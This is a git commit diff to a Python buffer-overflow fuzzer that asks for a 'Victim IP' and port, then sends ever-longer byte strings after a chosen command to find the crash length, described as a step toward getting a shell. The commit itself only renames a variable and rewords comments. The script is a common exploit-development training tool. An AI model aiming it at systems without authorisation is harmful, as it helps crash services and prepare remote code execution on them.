7605287c0f960435ff02dfba7816da733add07df
ApTR4t <85871550+ApTR4t@users.noreply.github.com>
2021-10-26 00:38:06 -0500

    Update Fuzzer.py

--- Fuzzer.py
+++ Fuzzer.py
@@ -1,11 +1,14 @@
 
 #!/usr/bin/env python3
-#BOF Fuzzer Modified
+#BOF Fuzzer
+#This script is for testing BOF's to determine needed parameters to achieve shell
 import socket, time, sys
-#Be certain when inputting you use " " double quotes around the ip as a string and not an messed up float.
+#Be certain when inputting you use double quotes around the ip as a string and not a float.
 ip = input("Victim IP:")
+#only integers in Port
 port = input("Port:")
-prefix = input("Enter Command:")
+#remember to add a blank space to the end of your string for the prefix
+command = input("Enter Command:")
 timeout = 5
 #appends 100 bytes to the end of the command each loop
 buffer = []
@@ -20,7 +23,7 @@ for x in buffer:
         s.settimeout(timeout)
         connect = s.connect((ip, port))
         print("Wiring bytes together.... %s" % len(x))
-        s.send(prefix + x + "\r\n")
+        s.send(command + x + "\r\n")
         s.recv(1024)
         s.send("EXIT\r\n")
         s.recv(1024)
